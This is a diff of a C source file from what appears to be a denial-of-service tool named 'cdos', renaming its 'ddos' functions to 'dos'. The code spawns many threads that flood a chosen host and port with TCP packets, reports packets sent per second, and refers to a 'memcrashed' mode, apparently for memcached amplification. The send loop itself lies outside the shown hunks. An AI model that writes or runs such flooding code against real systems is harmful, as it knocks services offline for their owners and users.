@@ -1,14 +1,13 @@
 //
-//  ddos.c
+//  dos.c
 //  cdos
 //
 //  Created by Andre Zay on 17.12.2017.
 //  Copyright © 2017 Andre Zay. All rights reserved.
 //
 
-#include "ddos.h"
+#include "dos.h"
 #include "util.h"
-#include "ping.h"
 
 #include <math.h>//pow
 #include <stdio.h>//close
@@ -37,7 +36,7 @@ int64_t plen;//packet length in bytes
 clock_t tm;//last time stat updated
 int64_t pc_old;//packets count on last stat update
 char *smetrics;//string of metrics type
-double psent_old;//old packet sendings(when ddos_stat() was called lsat time)
+double psent_old;//old packet sendings(when dos_stat() was called lsat time)
 
 void __exit()
 {
@@ -61,7 +60,7 @@ void __perror(){//for debugging
     pthread_mutex_unlock(&mutex);
     exit(-1);
 }
-void _ddos_tcp(char* host, int port, char* packet)
+void _dos_tcp(char* host, int port, char* packet)
 {
     tcount++;
     
@@ -119,7 +118,7 @@ void _ddos_tcp(char* host, int port, char* packet)
     tcount--;
 }
 
-void _ddos_stat()//update stat
+void _dos_stat()//update stat
 {
     success("Status:");
     success("Hit ^C to exit");
@@ -130,7 +129,7 @@ void _ddos_stat()//update stat
         if (!__run) {
             break;
         }
-        success_n("DDOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
+        success_n("DOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
         pc=0;
     }
 }
@@ -145,18 +144,16 @@ _dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
     return p;
 }
 
-
-
-void __ddos_wrapper(_dos_param* x)
+void __dos_wrapper(_dos_param* x)
 {
     if (x->mode == MODE_TCP) {
-        _ddos_tcp(x->host, x->port, x->packet);
+        _dos_tcp(x->host, x->port, x->packet);
     }else {
         error("Bad wrapper descriptor!");
         assert(false);
     }
 }
-void ddos(char* host, int port, char* packet, int _tcount, int mode)
+void dos(char* host, int port, char* packet, int _tcount, int mode)
 {
     signal(SIGPIPE, SIG_IGN);
     signal(SIGINT, __exit);
@@ -172,22 +169,22 @@ void ddos(char* host, int port, char* packet, int _tcount, int mode)
     psent_old=0.0;
     psent=0.0;
     _dos_param* p = _init_dos_p(host, port, packet, mode);
-    pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
+    pthread_t* _dos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
     // pthread_mutex_init(&mutex, NULL);
     if(status&&mode!=MODE_MEMCRASHED){
-        pthread_create(&_ddos[0], NULL, (void*)_ddos_stat, NULL);
+        pthread_create(&_dos[0], NULL, (void*)_dos_stat, NULL);
         status=1;
     }else{
         success("Hit ^C to exit");
-        success("DDOSing target %s",host);
+        success("DOSing target %s",host);
     }
     
     for (int i = status; i < _tcount + 1; i++) {
-        if (pthread_create(&_ddos[i], NULL, (void*)__ddos_wrapper, p)) {
+        if (pthread_create(&_dos[i], NULL, (void*)__dos_wrapper, p)) {
             error("Failed to create thread #%d!", i);
             continue;
         }
     }
     
-    pthread_join(_ddos[_tcount], NULL);
+    pthread_join(_dos[_tcount], NULL);
 }
